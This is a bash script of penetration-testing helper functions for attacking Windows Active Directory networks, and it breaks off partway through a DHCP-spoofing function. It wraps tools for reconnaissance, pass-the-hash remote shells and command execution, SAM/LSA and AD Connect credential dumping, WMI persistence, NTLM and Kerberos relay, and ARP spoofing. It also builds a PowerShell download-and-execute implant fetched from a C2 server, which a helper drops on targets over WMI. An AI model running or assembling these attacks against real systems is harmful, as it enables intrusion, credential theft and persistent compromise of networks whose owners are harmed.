#!/usr/bin/env bash
# DESCRIPTION: This script contains bash helper functions for basic pentesting tasks with local and domain PTH.

# SECTION: Required dependencies:
# DESCRIPTION: Required github repositories used in helper functions.

# https://github.com/fox-it/adconnectdump.git
# https://github.com/Hackplayers/evil-winrm.git
# https://github.com/SecureAuthCorp/impacket.git
# https://github.com/dirkjanm/krbrelayx.git
# https://github.com/fox-it/mitm6.git
# https://github.com/the-useless-one/pywerview.git
# https://github.com/Gallopsled/pwntools.git
# https://github.com/fox-it/BloodHound.py.git
# https://github.com/wshepherd0010/network.git

# SECTION: Global environment variables:
# DESCRIPTION: Environment variables used in helper functions -- DOMAIN, USER, PASSWORD, DCIP, C2SERVER, and IMPLANT.

export HELPER="${PWD}/helpers.sh";
export DOMAIN='';
export USER='';
export PASSWORD='';
export DCIP='';
export DOMAINUSER='';
export HASH='';
export HASHES='';
export C2SERVER='';
export IMPLANT='';

# SECTION: General helper functions:

function showHelp(){
    # DESCRIPTION: Displays helper functions and descriptions.
    # ARGUMENTS: None.
    HELP=`cat $HELPER | egrep "function|ARGUMENT|DESCRIPTION|SECTION:"|\
        grep -v "HELP"\
        |cut -d' ' -f2-100\
        |cut -d'(' -f1\
        |sed 's/SEC/\nSEC/g' ;`
    printf "$HELP";
    return;
}

function logSession(){
    # DESCRIPTION: Log bash session to file /var/LOGNAME_session_d_m_y_HM.log.
    # ARGUMENT: LOGNAME.
    LOGNAME=$1;
    screen -S sessionlogging -L -Logfile /var/log/$(date +"${LOGNAME}_session_%d_%m_%y_%H%M.log");
    return;
 }

function stopLoggingSession(){
    # DESCRIPTION: Log bash session to file /var/LOGNAME_session_d_m_y_HM.log.
    # ARGUMENT: LOGNAME.
    pkill screen;
    return;
}

function encodePayload(){
    # DESCRIPTION: Encodes PowerShell payloads into Base64 UTF-16 format.
    # ARGUMENT: PAYLOAD.
    PAYLOAD=$1
    echo $PAYLOAD | iconv -f ASCII -t UTF-16LE - | base64 | tr -d "\n";
    return;
}

function encodeHash(){
    # DESCRIPTION: Encodes plaintext passwords into NTLM hash format.
    # ARGUMENT: PASS.
    PASS=$1;
    printf \
    "import hashlib,binascii;print(binascii.hexlify(hashlib.new('md4','${PASS}'.encode('utf-16le')).digest()))" \
    | python -
    return;
}

function setVariables(){
    # DESCRIPTION: Sets global environment variables for credentials and domain settings.
    # ARGUMENT: None.
    export IMPLANT="powershell -exec bypass -c iex((new-object net.webclient).downloadstring('${C2SERVER}/${IMPLANT}'))";
    export DOMAINUSER="${DOMAIN}/${USER}";
    export HASH=`encodeHash ${PASSWORD}`;
    export HASHES=":${HASH}";
    return;
}

function setUserByPassword(){
    # DESCRIPTION: Set current domain user by password.
    # ARGUMENT: USER, DOMAIN, PASSWORD.
    export USER=$1;
    export DOMAIN=$2;
    export PASSWORD=$3;
    export DCIP=$2;
    setVariables;
    return;
}

function setLocalUserByPassword(){
    # DESCRIPTION: Set current local user by password.
    # ARGUMENT: USER, PASSWORD, TARGET.
    export USER=$1;
    export PASSWORD=$2;
    export TARGET=$3;
    setVariables;
    export DOMAINUSER=$USER;
    export DOMAIN="";
    export DCIP="";
    return;
}

function setUserByHash(){
    # DESCRIPTION: Set current domain user by hash.
    # ARGUMENT: USER, DOMAIN, HASH.
    export USER=$1;
    export DOMAIN=$2;
    setVariables;
    export HASH=$3;
    export HASHES=":${HASH}";
    export PASSWORD=$HASHES;
    export DCIP=$2;
    return;
}

function setLocalUserByHash(){
    # DESCRIPTION: Set current local user by hash.
    # ARGUMENT: USER, HASH, TARGET.
    export USER=$1;
    export TARGET=$3;
    setVariables;
    export DOMAINUSER=$USER;
    export HASH=$2;
    export HASHES=":${HASH}";
    export PASSWORD=$HASHES;
    export DOMAIN="";
    export DCIP="";
    return;
}

# SECTION: Unauthenticated reconnaissance helper functions:

function pingSweeps(){
    # DESCRIPTION: Ping sweep of target list with random data.
    # ARGUMENT: TARGET.
    TARGET=$1;
     nmap -oA "${TARGET}_ping_sweep_list" -v -T 3 \
        -PP --data "\x41\x41" -n -sn -iL $TARGET;
    return;
}

function pingSweep(){
    # DESCRIPTION: Ping single target using random data.
    # ARGUMENT: TARGET.
    TARGET=$1;
     nmap -oA "${TARGET}_ping_sweep" -v -T 3 \
        -PP --data "\x41\x41" -n -sn $TARGET;
    return;
}

function scanSMBSettings(){
    # DESCRIPTION: Scan target list for SMBv1 and SMBv2 security settings.
    # ARGUMENT: TARGET.
    TARGET=$1;
    proxychains \
    nmap -v -Pn -sT \
    --script smb-security-mode,smb2-security-mode -T 3 \
         --open -p445 \
         -iL $TARGET \
         -oA "${TARGET}_smb_settings_scans";
    return;
}

function fingerPrintSMBHTTP(){
    # DESCRIPTION: Scan target list for SMB and HTTP/HTTPS services.
    # ARGUMENT: TARGET.
    TARGET=$1;
    proxychains \
    nmap -v -Pn -sT -sV -T 3 \
         --open -p445,80,443 \
         -iL $TARGET \
         -oA "${TARGET}_smb_http_scans";
    return;
}

function serviceScan(){
    # DESCRIPTION: Scan target list for recon/RCE services (DNS, RPC, SMB, HTTP, RDP, LDAP, WinRM, SCM, MSSQL).
    # ARGUMENT: TARGET.
    TARGET=$1;
    proxychains \
    nmap -v -T 4 -Pn -sT \
         --open -p53,135,137,139,445,80,443,3389,386,636,5985,2701,1433,1961,1962 \
         -iL $TARGET \
         -oA "${TARGET}_service_scans";
    return;
}

function dnsScan(){
    # DESCRIPTION: Scan target for TCP/UDP DNS services.
    # ARGUMENT: TARGET.
    TARGET=$1;
    proxychains \
    nmap -v -Pn -sT -oA "${TARGET}_dns_scan" --open -p T:53,U:53 -T 3 $TARGET;
    return;
}

function dnsBroadcastDiscovery(){
    # DESCRIPTION: Scan local network for DNS broadcast on TCP/UDP.
    # ARGUMENT: None.
    nmap -v -oA "dns_broadcast" \
    --script broadcast-dns-service-discovery -p T:53,U:53;
    return;
}

function getInterfaces(){
    # DESCRIPTION: Scan target for RPC/DCOM interfaces.
    # ARGUMENT: TARGET.
    TARGET=$1;
    proxychains ifmap.py $TARGET 135;
    return;
}

function dumpRPC(){
    # DESCRIPTION: Dump target RPC/DCOM information.
    # ARGUMENT: TARGET.
    TARGET=$1;
    proxychains rpcdump.py -port 135 $TARGET;
    return;
}

function dumpSAMR(){
    # DESCRIPTION: Scan target SAMR user information.
    # ARGUMENT: TARGET.
    TARGET=$1;
    proxychains samrdump.py -no-pass $TARGET;
    return;
}

function dumpSIDs(){
    # DESCRIPTION: Scan target SID information.
    # ARGUMENT: TARGET.
    TARGET=$1;
    proxychains lookupsid.py \
    -domain-sids -no-pass $TARGET;
    return;
}

# SECTION: Authenticated reconnaissance function helpers:

function runBloodhound(){
    # DESCRIPTION: Run Bloodhound ingestor on target domain controllers.
    # ARGUMENT: TARGET, TDOMAIN.
    TARGET=$1;
    TDOMAIN=$2;
    proxychains \
    bloodhound-python -c DCOnly \
    -u "${USER}@${DOMAIN}" \
    --hashes $HASHES \
    -dc $TDOMAIN -gc $TDOMAIN -d $TARGET -v;
    return;
}

function getSPNs(){
    # DESCRIPTION: Save SPNs from target domain.
    # ARGUMENT: TARGET.
    TARGET=$1;
    proxychains \
    GetUserSPNs.py \
    -target-domain $DOMAIN \
    -request -outputfile $DOMAIN \
    -no-pass -hashes $HASHES \
    -dc-ip $DCIP ${DOMAINUSER}@${TARGET}
    return;
}

function getNPUsers(){
    # DESCRIPTION: Save target NP user details.
    # ARGUMENT: TARGET.
    TARGET=$1;
    proxychains \
    GetNPUsers.py "${DOMAIN}/${TARGET}" \
    -outputfile $TARGET -no-pass;
    return;
}

function checkLocalAdmin(){
    # DESCRIPTION: Check target for local admin privileges.
    # ARGUMENT: TARGET.
    TARGET=$1;
    if [[ -z "$DOMAIN" ]]
    then
          proxychains \
            pywerview invoke-checklocaladminaccess \
            -w $TARGET -u $USER \
            --hashes $HASHES --computername "${TARGET}";
    else
          proxychains \
            pywerview invoke-checklocaladminaccess \
            -w $DOMAIN -u $USER \
            --hashes $HASHES --computername "${TARGET}";
    fi
    return;
}

function wmiSurvey(){
    # DESCRIPTION: Run WMI survey on remote target.
    # ARGUMENT: TARGET.
    TARGET=$1;
    printf "
    select Caption,Description, HotFixID, InstalledOn from Win32_QuickFixEngineering;
    select * from Win32_Product;
    select * from Win32_OperatingSystem;
    select Command, User, Caption from Win32_StartupCommand;
    select Name, Pathname, State, StartMode, StartName from Win32_Service;
    select Name, ProcessId, ParentProcessId, ExecutablePath from Win32_Process;
    select * From Win32_NetworkAdapter;
    select * From Win32_NetworkAdapterConfiguration;
    select * from Win32_Share;
    select * from Win32_MappedLogicalDisk;
    select * from Win32_ComputerSystem;
    select Antecedent from Win32_LoggedOnUser;
    exit
    " > /tmp/query.wql;
    if [[ -z "$DOMAIN" ]]
    then
          proxychains \
            wmiquery.py \
            -no-pass -hashes $HASHES \
            -file /tmp/query.wql \
            ${USER}@${TARGET};
    else
          proxychains \
            wmiquery.py \
            -no-pass -hashes $HASHES \
            -file /tmp/query.wql \
            -dc-ip $DCIP ${DOMAINUSER}@${TARGET};
    fi
    rm /tmp/query.wql;
    return;
}

function wmiQuery(){
    # DESCRIPTION: Run WMI query on remote target.
    # ARGUMENT: TARGET.
    TARGET=$1;
    if [[ -z "$DOMAIN" ]]
    then
          proxychains \
            wmiquery.py \
            -no-pass -hashes $HASHES \
            ${USER}@${TARGET};
    else
          proxychains \
            wmiquery.py \
            -no-pass -hashes $HASHES \
            -dc-ip $DCIP ${DOMAINUSER}@${TARGET};
    fi
    return;
}

function registryQuery(){
    # DESCRIPTION: Run registry query on remote target.
    # ARGUMENT: TARGET, QUERY.
    TARGET=$1;
    QUERY=$2;
    if [[ -z "$DOMAIN" ]]
    then
        proxychains \
        reg.py \
        -no-pass -hashes $HASHES \
        ${USER}@${TARGET} \
        query -keyName $QUERY -s;
    else
        proxychains \
        reg.py \
        -no-pass -hashes $HASHES \
        -dc-ip $DCIP ${DOMAINUSER}@${TARGET} \
        query -keyName $QUERY -s;
    fi
    return;
}

function serviceQuery(){
    # DESCRIPTION: Run service query on remote target.
    # ARGUMENT: TARGET.
    TARGET=$1;
    if [[ -z "$DOMAIN" ]]
    then
          proxychains \
            services.py \
            -no-pass -hashes $HASHES \
            ${USER}@${TARGET} list;
    else
          proxychains \
            services.py \
            -no-pass -hashes $HASHES \
            -dc-ip $DCIP ${DOMAINUSER}@${TARGET} list;
    fi
    return;
}

function huntProcess(){
    # DESCRIPTION: Hunt user processes on remote target.
    # ARGUMENT: TARGET, COMPUTER.
    TARGET=$1;
    COMPUTER=$2;
    proxychains \
    pywerview invoke-processhunter -w $DOMAIN -u $USER \
    --hashes $HASHES --dc-ip $DCIP \
    -d $DOMAIN --show-all \
    --computername ${COMPUTER} \
    --username ${TARGET};
    return;
}

function getProcess(){
    # DESCRIPTION: Scan remote target for processes.
    # ARGUMENT: TARGET.
    TARGET=$1;
    proxychains \
    pywerview get-netprocess -w $DOMAIN -u $USER \
    --hashes $HASHES \
    --computername $TARGET;
    return;
}

function getSessions(){
    # DESCRIPTION: Scan remote target for SMB sessions.
    # ARGUMENT: TARGET.
    TARGET=$1;
    proxychains \
    pywerview get-netsession -w $DOMAIN -u $USER \
    --hashes $HASHES \
    --computername $TARGET;
    return;
}

function getShares(){
    # DESCRIPTION: Scan remote target for SMB shares.
    # ARGUMENT: TARGET.
    TARGET=$1;
    proxychains \
    pywerview get-netshare -w $DOMAIN -u $USER \
    --hashes $HASHES \
    --computername $TARGET;
    return;
}

function huntUser(){
    # DESCRIPTION: Scan for users on remote target.
    # ARGUMENT: TARGET.
    TARGET=$1;
    proxychains \
    pywerview invoke-userhunter -w $DOMAIN -u $USER \
    --hashes $HASHES --dc-ip $DCIP \
    -d $DOMAIN --stealth --stealth-source dc \
    --show-all --username "${TARGET}";
    return;
}

function getGroupMember(){
    # DESCRIPTION: Scan group membership on target groups.
    # ARGUMENT: TARGET.
    TARGET=$1;
    proxychains \
    pywerview get-netgroupmember -w $DOMAIN -u $USER \
    --hashes $HASHES --dc-ip $DCIP --groupname "${TARGET}";
    return;
}

function getGroups(){
    # DESCRIPTION: Scan groups on targets.
    # ARGUMENT: TARGET.
    TARGET=$1;
    proxychains \
    pywerview get-netgroup -w $DOMAIN -u $USER \
    --hashes $HASHES --dc-ip $DCIP -d ${TARGET};
    return;
}

function getGroup(){
    # DESCRIPTION: Scan for target groups.
    # ARGUMENT: TARGET.
    TARGET=$1;
    proxychains \
    pywerview get-netgroup -w $DOMAIN -u $USER \
    --hashes $HASHES --dc-ip $DCIP --groupname "${TARGET}";
    return;
}

function getLoggedOn(){
    # DESCRIPTION: Scan remote targets for logged on users.
    # ARGUMENT: TARGET.
    TARGET=$1;
    proxychains \
    pywerview get-netloggedon -w $DOMAIN -u $USER \
    --hashes $HASHES --computername $TARGET;
    return;
}

function getDomainPolicy(){
    # DESCRIPTION: Scan domain group/password policy.
    # ARGUMENT: TARGET.
    TARGET=$1;
    proxychains \
    pywerview get-domainpolicy -w $DOMAIN -u $USER \
    --hashes $HASHES \
    -t $DCIP -d $DOMAIN;
    return;
}

function getComputer(){
    # DESCRIPTION: Scan for computer in target domain.
    # ARGUMENT: TARGET, TDOMAIN.
    TARGET=$1;
    TDOMAIN=$2;
    proxychains \
    pywerview get-netcomputer -w $DOMAIN -u $USER \
    --full-data --ping \
    --hashes $HASHES \
    -t $DCIP -d $TDOMAIN --computername $TARGET;
    return;
}

function getFullComputers(){
    # DESCRIPTION: Scan for full computer details in target domain.
    # ARGUMENT: TARGET.
    TARGET=$1;
    proxychains \
    pywerview get-netcomputer -w $DOMAIN -u $USER \
    --full-data --ping \
    --hashes $HASHES \
    -t $DCIP -d $TARGET;
    return;
}

function getComputers(){
    # DESCRIPTION: Scan for computer hostnames in target domain.
    # ARGUMENT: TARGET.
    TARGET=$1;
    proxychains \
    pywerview get-netcomputer -w $DOMAIN -u $USER \
    --hashes $HASHES \
    -t $DCIP -d $TARGET;
    return;
}

function getDelegation(){
    # DESCRIPTION: Scan for user and computer delegation in target domains.
    # ARGUMENT: TARGET.
    TARGET=$1;
    proxychains \
    findDelegation.py \
    -no-pass -hashes $HASHES \
    -target-domain $TARGET \
    "${DOMAINUSER}";
    return;
}

function getUnconstrainedUsers(){
    # DESCRIPTION: Scan for unconstrained users in target domain.
    # ARGUMENT: TARGET.
    TARGET=$1;
    proxychains \
    pywerview get-netuser -w $DOMAIN -u $USER \
    --hashes $HASHES --unconstrained \
    -t $DCIP -d $TARGET;
    return;
}

function getUnconstrainedComputers(){
    # DESCRIPTION: Scan for unconstrained computers on target domain.
    # ARGUMENT: TARGET.
    TARGET=$1;
    proxychains \
    pywerview get-netcomputer -w $DOMAIN -u $USER \
    --hashes $HASHES --unconstrained \
    -t $DCIP -d $TARGET;
    return;
}

function getUser(){
    # DESCRIPTION: Scan for user details in target domain.
    # ARGUMENT: TARGET.
    TARGET=$1;
    proxychains \
    pywerview get-netuser -w $DOMAIN -u $USER \
    --hashes $HASHES \
    -t $DCIP -d $DOMAIN --username $TARGET;
    return;
}

function getUsers(){
    # DESCRIPTION: Scan for users in target domain.
    # ARGUMENT: TARGET.
    TARGET=$1;
    proxychains \
    pywerview get-netuser \
    -w $DOMAIN -u $USER \
    --hashes $HASHES \
    -t $DCIP -d $TARGET;
    return;
}

# SECTION: Command execution helper functions:

function winRMShell(){
    # DESCRIPTION: WinRM/PSRP shell on target system.
    # ARGUMENT: TARGET.
    TARGET=$1;
    if [[ -z "$DOMAIN" ]]
    then
          proxychains \
            evil-winrm -i $TARGET \
            -u $USER -H $HASH \
            -s ./ -e ./ -P 5985;
    else
          proxychains \
            evil-winrm -i $TARGET \
            -u "${DOMAIN}\\${USER}" -H $HASH \
            -s ./ -e ./ -P 5985;
    fi
    return;
}

function wmiShell(){
    # DESCRIPTION: WMI shell on target system.
    # ARGUMENT: TARGET.
    TARGET=$1;
    proxychains \
    wmiexec.py \
    -no-pass -hashes $HASHES \
    -dc-ip $DCIP ${DOMAINUSER}@${TARGET};
    return;
}

function smbShell(){
    # DESCRIPTION: SMB shell on target system.
    # ARGUMENT: TARGET.
    TARGET=$1;
    if [[ -z "$DOMAIN" ]]
    then
          proxychains \
            smbexec.py \
            -no-pass -hashes $HASHES \
            -service-name Win32SCCM \
            ${USER}@${TARGET};
    else
          proxychains \
            smbexec.py \
            -no-pass -hashes $HASHES \
            -service-name Win32SCCM \
            -dc-ip $DCIP ${DOMAINUSER}@${TARGET};
    fi
    return;
}

function wmiCommand(){
    # DESCRIPTION: Execute WMI command without output on target system.
    # ARGUMENT: TARGET, COMMAND.
    TARGET=$1;
    COMMAND=$2;
    if [[ -z "$DOMAIN" ]]
    then
          proxychains \
            wmiexec.py \
            -nooutput \
            -no-pass -hashes $HASHES \
            ${USER}@${TARGET} "${COMMAND}";
    else
          proxychains \
            wmiexec.py \
            -nooutput \
            -no-pass -hashes $HASHES \
            -dc-ip $DCIP ${DOMAINUSER}@${TARGET} "${COMMAND}";
    fi
    return;
}

function psexecCommand(){
    # DESCRIPTION: Execute PSexec command on target system.
    # ARGUMENT: TARGET, COMMAND.
    TARGET=$1;
    COMMAND=$2;
    if [[ -z "$DOMAIN" ]]
    then
          proxychains \
            psexec.py \
            -no-pass -hashes $HASHES \
            ${USER}@${TARGET} "${COMMAND}";
    else
        proxychains \
            psexec.py \
            -no-pass -hashes $HASHES \
            -dc-ip $DCIP ${DOMAINUSER}@${TARGET} "${COMMAND}";
    fi
    return;
}

function atCommand(){
    # DESCRIPTION: Execute AT/scheduled task on target system.
    # ARGUMENT: TARGET, COMMAND.
    TARGET=$1;
    COMMAND=$2;
    if [[ -z "$DOMAIN" ]]
    then
          proxychains \
            atexec.py \
            -no-pass -hashes $HASHES \
            ${USER}@${TARGET} "${COMMAND}";
    else
          proxychains \
            atexec.py \
            -no-pass -hashes $HASHES \
            -dc-ip $DCIP ${DOMAINUSER}@${TARGET} "${COMMAND}";
    fi
    return;
}

function dcomCommand(){
    # DESCRIPTION: Execute RPC/DCOM command on target system.
    # ARGUMENT: TARGET, COMMAND.
    TARGET=$1;
    COMMAND=$2;
    if [[ -z "$DOMAIN" ]]
    then
          proxychains \
            dcomexec.py \
            -nooutput \
            -no-pass -hashes $HASHES \
            ${USER}@${TARGET} "${COMMAND}";
    else
          proxychains \
            dcomexec.py \
            -nooutput \
            -no-pass -hashes $HASHES \
            -dc-ip $DCIP ${DOMAINUSER}@${TARGET} "${COMMAND}";
    fi
    return;
}

# SECTION: Client helper functions:

function mountSSHShare(){
    # DESCRIPTION: Mount remote SSH share on ssh_share directory.
    # ARGUMENT: TUSER, TARGET, SHARE.
    TUSER=$1;
    TARGET=$2;
    SHARE=$3;
    mkdir ./ssh_share;
    proxychains sshfs "${TUSER}"@"${TARGET}:/${SHARE}" ./ssh_share;
    return;
}

function mountShare(){
    # DESCRIPTION: Mount remote SMB share on tmpshare directory.
    # ARGUMENT: TARGET, SHARE.
    TARGET=$1;
    SHARE=$2;
    mkdir ./tmpshare;
    mount -t cifs "//${TARGET}/${SHARE}" ./tmpshare \
    -o username=${USER},password=${PASSWORD},domain=${DOMAIN},iocharset=utf8,file_mode=0777,dir_mode=0777;
    return;
}

function mssqlConnect(){
    # DESCRIPTION: Connect to remote MSSQL database.
    # ARGUMENT: TARGET, DB, PORT.
    TARGET=$1;
    DB=$2
    PORT=$3;
    if [[ -z "$DOMAIN" ]]
    then
          proxychains \
            mssqlclient.py \
            -port $PORT -db $DB \
            ${USER}:${PASSWORD}@${TARGET};
    else
          proxychains \
            mssqlclient.py \
            -windows-auth -port $PORT -db $DB \
            -no-pass -hashes $HASHES \
            -dc-ip $DCIP ${DOMAINUSER}@${TARGET};
    fi
    return;
}

function smbConnect(){
    # DESCRIPTION: Connect to remote SMB share.
    # ARGUMENT: TARGET.
    TARGET=$1;
    if [[ -z "$DOMAIN" ]]
    then
          proxychains \
            smbclient.py \
            -no-pass -hashes $HASHES \
            ${USER}@${TARGET};
    else
          proxychains \
            smbclient.py \
            -no-pass -hashes $HASHES \
            -dc-ip $DCIP ${DOMAINUSER}@${TARGET};
    fi
    return;
}

# SECTION: Server helper functions:

function localProxy(){
    # DESCRIPTION: Spin up local SOCKS proxy on port 1080.
    # ARGUMENT: None.
    ssh -f -N -D 192.168.243.133:1080 root@bigkali;
    return;
}

function httpServer(){
    # DESCRIPTION: Spin up local HTTP server on port 80.
    # ARGUMENT: None.
    python -m SimpleHTTPServer 80;
    return;
}

function smbServer(){
    # DESCRIPTION: Spin up local SMB server in current folder on port 445.
    # ARGUMENT: IPADDRESS.
    IPADDRESS=$1;
    smbserver.py -ip $IPADDRESS \
        -port 445 -smb2support PWN ./ ;
    return;
}

function socksProxy(){
    # DESCRIPTION: Spin up dynamic SOCKS proxy.
    # ARGUMENT: LHOST, LPORT, RUSER, RHOST.
    LHOST=$1;
    LPORT=$2;
    RUSER=$3;
    RHOST=$4;
    ssh -f -N -D ${LHOST}:${LPORT} ${RUSER}@${RHOST};
    return;
}

# SECTION: Post exploitation helper functions:

function dumpADConnect(){
    # DESCRIPTION: Dump AD Sync credentials on remote target.
    # ARGUMENT: TARGET.
    TARGET=$1;
    if [[ -z "$DOMAIN" ]]
    then
          proxychains \
            python /opt/adconnectdump/adconnectdump.py \
            -outputfile $TARGET \
            -no-pass -hashes $HASHES \
            ${USER}@${TARGET};
    else
          proxychains \
            python /opt/adconnectdump/adconnectdump.py \
            -outputfile $TARGET \
            -no-pass -hashes $HASHES \
            -dc-ip $DCIP ${DOMAINUSER}@${TARGET};
    fi
    return;
}

function dumpSAM(){
    # DESCRIPTION: Dump SAM and LSA secrets on remote host.
    # ARGUMENT: TARGET.
    TARGET=$1;
    if [[ -z "$DOMAIN" ]]
    then
          proxychains \
            secretsdump.py \
            -outputfile $TARGET \
            -no-pass -hashes $HASHES \
            ${USER}@${TARGET};
    else
          proxychains \
            secretsdump.py \
            -outputfile $TARGET \
            -no-pass -hashes $HASHES \
            -dc-ip $DCIP ${DOMAINUSER}@${TARGET};
    fi
    return;
}

function wmiPersist(){
    # DESCRIPTION: WMI persistence on remote target.
    # ARGUMENT: TARGET, PAYLOAD.
    TARGET=$1;
    PAYLOAD=$2;
    if [[ -z "$DOMAIN" ]]
    then
          proxychains \
            wmipersist.py \
            -no-pass -hashes $HASHES \
            ${USER}@${TARGET} \
            install -name PWN \
            -vbs $PAYLOAD -timer 120000;
    else
          proxychains \
            wmipersist.py \
            -no-pass -hashes $HASHES \
            -dc-ip $DCIP ${DOMAINUSER}@${TARGET} \
            install -name PWN \
            -vbs $PAYLOAD -timer 120000;
    fi
    return;
}

function removeWmiPersist(){
    # DESCRIPTION: Remove WMI persistence on remote target.
    # ARGUMENT: TARGET.
    TARGET=$1;
    if [[ -z "$DOMAIN" ]]
    then
          proxychains \
            wmipersist.py \
            -no-pass -hashes $HASHES \
            ${USER}@${TARGET} \
            remove -name PWN;
    else
          proxychains \
            wmipersist.py \
            -no-pass -hashes $HASHES \
            -dc-ip $DCIP ${DOMAINUSER}@${TARGET} \
            remove -name PWN;
    fi
    return;
}

# SECTION: Exploitation helper functions:

function dropImplant(){
    # DESCRIPTION: Drop implant on remote target using WMI.
    # ARGUMENT: TARGET.
    TARGET=$1;
    wmiCommand $TARGET $IMPLANT;
    return;
}

function mitm6DHCP(){
    # DESCRIPTION: MITM attack using IPv6 to IPv4 WPAD.
    # ARGUMENT: DOMAIN, IP4ADD, IP6ADD, MACADD.
    DOMAIN=$1;
    IP4ADD=$2;
    IP6ADD=$3;
    MACADD=$4;
    mitm6 -i eth0 \
    -4 $IP4ADD \
    -6 $IP6ADD \
    -m $MACADD -a -v \
    -d $DOMAIN;
    return;
}

function ntlmRelayDelegate(){
    # DESCRIPTION: NTLM relay attack using delegation vectors.
    # ARGUMENT: TCOMPUTER, TSERVER, WPAD.
    TCOMPUTER=$1;
    TSERVER=$2;
    WPAD=$3;
    ntlmrelayx.py \
    -wh $WPAD --delegate-access \
    --escalate-user "${TCOMPUTER}\$" \
    -t $TSERVER;
    return;
}

function removeComputer(){
    # DESCRIPTION: Remove computer from AD domain.
    # ARGUMENT: TCOMPUTER, TPASSWORD, TGROUP.
    TCOMPUTER=$1;
    TPASSWORD=$2;
    TGROUP=$3;
    proxychains \
    addcomputer.py -method SAMR \
    -computer-pass $TPASSWORD \
    -computer-name $TCOMPUTER \
    -no-pass -hashes $HASHES \
    -delete -computer-group $TGROUP \
    -dc-ip $DCIP $DOMAINUSER;
    return;
}

function addComputer(){
    # DESCRIPTION: Add computer to AD domain.
    # ARGUMENT: TCOMPUTER, TPASSWORD, TGROUP.
    TCOMPUTER=$1;
    TPASSWORD=$2;
    TGROUP=$3;
    proxychains \
    addcomputer.py -method SAMR \
    -computer-pass $TPASSWORD \
    -computer-name $TCOMPUTER \
    -computer-group $TGROUP \
    -no-pass -hashes $HASHES \
    -dc-ip $DCIP $DOMAINUSER;
    return;
}

function getST(){
    # DESCRIPTION: Get TGT on target domain.
    # ARGUMENT: SPN, TARGET.
    SPN=$1;
    TARGET=$2;
    proxychains \
        getST.py -spn $SPN \
        -impersonate $TARGET \
        -no-pass -hashes $HASHES \
        -dc-ip $DCIP $DOMAINUSER;
    return;
}

function addDNS(){
    # DESCRIPTION: Add DNS on target domain.
    # ARGUMENT: DNS, TARGETIP.
    DNS=$1;
    TARGETIP=$2;
    proxychains \
    /opt/krbrelayx/dnstool.py \
    -u "${DOMAIN}\\${USER}" \
    -p $PASSWORD \
    -r $DNS -a add -d $TARGETIP;
    return;
}

function queryDNS(){
    # DESCRIPTION: Query DNS on target domain.
    # ARGUMENT: DNS, TARGETIP.
    DNS=$1;
    TARGETIP=$2;
    proxychains \
    /opt/krbrelayx/dnstool.py \
    -u "${DOMAIN}\\${USER}" \
    -p $PASSWORD \
    -r $DNS -a query -d $TARGETIP;
    return;
}

function removeDNS(){
    # DESCRIPTION: Remove DNS on target system.
    # ARGUMENT: DNS, TARGETIP.
    DNS=$1;
    TARGETIP=$2;
    proxychains \
    /opt/krbrelayx/dnstool.py \
    -u "${DOMAIN}\\${USER}" \
    -p $PASSWORD \
    -r $DNS -a remove -d $TARGETIP;
    return;
}

function removeSPN(){
    # DESCRIPTION: Remove SPN from target system.
    # ARGUMENT: SPN, SERVER.
    SPN=$1;
    SERVER=$2;
    proxychains \
    /opt/krbrelayx/addspn.py \
    -u "${DOMAIN}\\${USER}" \
    -p $PASSWORD \
    -s $SPN -r $SERVER;
    return;
}

function querySPN(){
    # DESCRIPTION: Query SPN on target system.
    # ARGUMENT: SPN, SERVER.
    SPN=$1;
    SERVER=$2;
    proxychains \
    /opt/krbrelayx/addspn.py \
    -u "${DOMAIN}\\${USER}" \
    -p $PASSWORD \
    -s $SPN -q $SERVER;
    return;
}

function addSPN(){
    # DESCRIPTION: Add SPN on target system.
    # ARGUMENT: SPN, SERVER.
    SPN=$1;
    SERVER=$2;
    proxychains \
    /opt/krbrelayx/addspn.py \
    -u "${DOMAIN}\\${USER}" \
    -p $PASSWORD \
    -s $SPN $SERVER;
    return;
}

function krbRelay(){
    # DESCRIPTION: KRP relay for target AD user.
    # ARGUMENT: TDOMAINUSER, TPASSWORD.
    TDOMAINUSER=$1;
    TPASSWORD=$2;
    python /opt/krbrelayx/krbrelayx.py \
    --krbsalt "${TDOMAINUSER}" \
    --krbpass $TPASSWORD;
    return;
}

function printerRelay(){
    # DESCRIPTION: Print spool MSRPC on target system.
    # ARGUMENT: TARGET, ATTACKER.
    TARGET=$1;
    ATTACKER=$2;
    proxychains \
    /opt/krbrelayx/printerbug.py \
    -no-pass -hashes $HASHES \
    ${DOMAINUSER}@${TARGET} $ATTACKER;
    return;
}

function smbRelay(){
    # DESCRIPTION: SMB relay to remote target.
    # ARGUMENT: TARGET.
    TARGET=$1;
    smbrelayx.py \
    -ts -debug \
    -h $TARGET \
    -one-shot
    return;
}

function ntlmRelay(){
    # DESCRIPTION: NTLM relay to target systems.
    # ARGUMENT: TARGETS.
    TARGETS=$1
    ntlmrelayx.py -ts  \
    -tf "./${TARGETS}" \
    --smb-port 445 \
    --http-port 80 -l ./ \
    -of hashes-relayed \
    -smb2support \
    --remove-mic \
    --enum-local-admins \
    -debug -i -w;
    return ;
}

function respondRelay(){
    # DESCRIPTION: Responder for NTLM relay attack.
    # ARGUMENT: None.
    responder -v \
    -I eth0 -dwrf -P -v;
    return;
}

function ntlmRelaySix(){
    # DESCRIPTION: NTLM relay using IPv6 attack.
    # ARGUMENT: TARGETS, WPAD.
    TARGETS=$1
    WPAD=$2;
    ntlmrelayx.py -6  \
    -wh $WPAD \
    -tf "./${TARGETS}" \
    --smb-port 445 \
    --http-port 80 -l ./ \
    -of hashes-relayed \
    -smb2support \
    -socks --remove-mic \
    --enum-local-admins \
    -debug -i -w;
    return ;
}

function mitmSix(){
    # DESCRIPTION: MITM attack using IPv6 DHCP.
    # ARGUMENT: TARGET.
    TARGET=$1
    mitm6.py -d $DOMAIN \
    -hw $TARGET;
    return ;
}

function arpSpoof(){
    # DESCRIPTION: MITM attack using ARP spoofing.
    # ARGUMENT: TARGETSERVER, TARGETCLIENT, PORT, GATEWAY, ATTACKER.
    TARGETSERVER=$1;
	TARGETCLIENT=$2;
	PORT=$3;
	GATEWAY=$4;
	ATTACKER=$5;
	echo 1 > /proc/sys/net/ipv4/ip_forward;
	iptables -F;
	iptables -t nat -F;
	iptables -X;
	iptables -t nat \
	-A PREROUTING \
	-p tcp -d $TARGETSERVER \
	--dport $PORT \
	-j DNAT \
	--to-destination $ATTACKER:$PORT;
    arpspoof -i eth0 -t $TARGETCLIENT $GATEWAY;
    return;
}

function dhcpSpoof() {
    # DESCRIPTION: MITM attack using DHCP spoofing.
    # ARGUMENT: TARGETDNS, PORT, ATTACKER.
